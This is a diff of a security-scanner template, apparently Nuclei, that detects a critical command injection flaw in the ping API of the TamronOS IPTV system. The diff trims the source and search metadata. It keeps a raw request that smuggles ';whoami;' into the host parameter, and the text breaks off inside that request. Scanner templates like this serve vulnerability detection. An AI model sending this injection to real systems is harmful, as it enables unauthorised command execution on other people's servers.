@@ -3,14 +3,8 @@ info:
   name: TamronOSIPTV系统ping存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/b2b15c5832d1e8f47c04da37ca9d304c
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: b2b15c5832d1e8f47c04da37ca9d304c
-    fofa: + fofa`app="TamronOS-IPTV系统"`
 http:
 - raw:
   - 'POST /api/ping?count=5&host=;whoami; HTTP/1.1
